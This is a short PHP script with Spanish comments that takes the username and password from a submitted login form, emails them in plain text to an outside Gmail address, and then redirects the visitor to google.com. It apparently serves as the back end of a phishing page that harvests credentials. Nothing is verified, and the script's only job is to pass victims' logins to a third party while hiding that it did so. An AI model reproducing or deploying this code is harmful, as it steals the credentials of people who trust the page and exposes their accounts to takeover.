if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];

    // Aquí puedes enviar un correo electrónico
    $to = "rogrjt@gmail.com";
    $subject = "Inicio de sesión";
    $message = "Usuario: $username\nContraseña: $password";
    $headers = "From: webmaster@example.com";

    // Utiliza la función mail para enviar el correo
    mail($to, $subject, $message, $headers);

    // Puedes redirigir al usuario a una página de éxito o hacer otras operaciones después del envío del correo.
    header("Location: https://www.google.com");
    exit();
}
?>